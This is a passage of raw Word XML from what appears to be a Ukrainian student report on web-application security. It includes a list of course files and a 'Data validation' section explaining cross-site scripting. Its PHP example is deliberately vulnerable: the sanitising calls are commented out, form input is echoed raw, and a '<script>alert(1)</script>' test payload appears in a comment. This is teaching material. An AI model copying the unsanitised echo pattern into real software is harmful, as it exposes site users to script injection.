    </w:p>
    <w:p w14:paraId="1B584579" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./Web-Tech-Graphics-Lab.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246DF08D" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./Web-Tech-Crack-n-JQuery-Lab.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B2108A" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./lecture1-zag-pryntsypy-web-rozrobky-osnovy-php.ppt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52314444" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./lecture2-osnovy-JavaScript.ppt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4714BF24" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./lecture3-AJAX.ppt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F5AB23" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./lecture4-zapyty-klient-server.ppt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B31623" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./lecture5-mysql.ppt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19650DF1" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./lecture6-sesii.ppt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D49D22" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./lecture7-cache.ppt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9CFF3C" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./JS-jquery.zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F8917D" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./PHP-detailed.zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF24971" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./AJAX-suggestion.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF85681" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./Fridl_Dzh_Regulyarnye_vyrazhenia_3-e_izdanie_20.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311B86C7" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRPr="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0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" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE0849">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>./art-of-font.zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503A1C19" w14:textId="77777777" w:rsidR="00AE0849" w:rsidRDefault="00AE0849" w:rsidP="00AE0849">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F8F9274" w14:textId="7FAA7C40" w:rsidR="000216E5" w:rsidRDefault="000216E5" w:rsidP="00AE0849">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Даний метод фактично не є зламом, а є лише збором відкритої інформації, але від нього неможливо захиститися. Звісно, якщо не прибрати всі посилання з сайту, що буде дуже незручно для користувача.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E991060" w14:textId="395141E2" w:rsidR="004518F3" w:rsidRDefault="00F46E5D" w:rsidP="00646471">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Data validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A7197C" w14:textId="020DC806" w:rsidR="00646471" w:rsidRDefault="00646471" w:rsidP="00646471">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00646471">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r w:rsidRPr="00646471">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00646471">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>полягає</w:t>
      </w:r>
      <w:r w:rsidRPr="00646471">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>у відсутності перевірки наявності полів форми на наявність HTML-тегів, JS-скриптів, чи будь-якого іншого виду коду, що може виконуватися на сайті. При виведенні полів такої форми на екран код теж спрацьовує, що призводить до можливості повного зламу сайту.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C20AA2" w14:textId="77777777" w:rsidR="00646471" w:rsidRDefault="00646471" w:rsidP="00646471">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D1ED25B" w14:textId="174389FF" w:rsidR="00646471" w:rsidRDefault="00646471" w:rsidP="00646471">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Код </w:t>
      </w:r>
      <w:r>
        <w:t>form.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD99649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>&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0567242C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>&lt;html lang="en"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E3618E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>&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E227FEC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 xml:space="preserve">    &lt;meta charset="UTF-8"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C923376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 xml:space="preserve">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCD0E94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 xml:space="preserve">    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B5465E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 xml:space="preserve">    &lt;title&gt;Bad form&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D594EB4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 xml:space="preserve">    &lt;script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="762D1EF6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>&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C09BFD3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>&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D10D040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 xml:space="preserve">    &lt;form method="POST" id="formx" action="javascript:void(null);" onsubmit="call()"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691215D8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 xml:space="preserve">        &lt;h2&gt;Test From&lt;/h2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DCDD33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 xml:space="preserve">        &lt;label for="name"&gt;Name:&lt;/label&gt;&lt;input id="name" name="name" value="" type="text"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351EF6A6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 xml:space="preserve">        &lt;label for="email"&gt;Email:&lt;/label&gt;&lt;input id="email" name="email" value="" type="text"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE9015D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 xml:space="preserve">        &lt;input value="Send" type="submit"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E63C6E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 xml:space="preserve">    &lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A91451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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287D1E6D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 xml:space="preserve">    &lt;div id="results"&gt;&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6304FB82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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5131A81B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 xml:space="preserve">    &lt;script type="text/javascript" language="javascript"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790AF3A4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 xml:space="preserve">     </w:t>
      </w:r>
      <w:r w:rsidRPr="00646471">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t>function call() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3431C0A2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 xml:space="preserve">     </w:t>
      </w:r>
      <w:r w:rsidRPr="00646471">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">  var msg   = $('#formx').serialize();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B7C99C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 xml:space="preserve">            $.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBE5FCD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 xml:space="preserve">              type: 'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6E3EAC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 xml:space="preserve">              url: 'process.php',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4667286C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 xml:space="preserve">              data: msg,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E868C33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 xml:space="preserve">              success: function(data) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABD7FFC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 xml:space="preserve">                $('#results').html(data);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E398FA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 xml:space="preserve">              },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10706BAA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 xml:space="preserve">              error:  function(xhr, str){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DF1F1E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 xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00646471">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">    alert('Возникла ошибка: ' + xhr.responseCode);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B98AE0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 xml:space="preserve">              }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2611B06F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 xml:space="preserve">            });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAA4BDF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 xml:space="preserve">     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132D70AC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 xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514834F9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 xml:space="preserve">    &lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A252107" w14:textId="77777777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>&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2837EC4F" w14:textId="5D70EAF3" w:rsidR="00646471" w:rsidRPr="00646471" w:rsidRDefault="00646471" w:rsidP="00646471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646471">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44CED448" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE">
      <w:pPr>
        <w:ind w:firstLine="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DB2AC6A" w14:textId="799D1EA2" w:rsidR="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Код </w:t>
      </w:r>
      <w:r>
        <w:t>process.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E0ABE0" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="372E7BD4" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>echo "&lt;pre&gt;";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D514A7C" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    $name = $_POST["name"];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A3420E" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    $email = $_POST["email"];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C29BFBE" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78ADBFC1" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    // $name = strip_tags($name);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA236E4" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    // $name = htmlspecialchars($name);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36209255" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    // $name = mysql_escape_string($name);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9AA7FD" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2B57F9" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    // $email = strip_tags($email);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDAB4BD" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    // $email = htmlspecialchars($email);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005482DE" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    // $email = mysql_escape_string($email);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452D27B6" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70593946" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    // &lt;script&gt;alert(1)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F71796" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    // &lt;style&gt;body{background-color:blue;}&lt;/style&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0750915D" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E55548" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "Name: ".$name."\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51058359" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE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E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "Email: ".$email;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8CBF27" w14:textId="77777777" w:rsidR="00E73FAE" w:rsidRPr="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>echo "&lt;/pre&gt;";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAD378C" w14:textId="418E227F" w:rsidR="00E73FAE" w:rsidRDefault="00E73FAE" w:rsidP="00E73FAE">
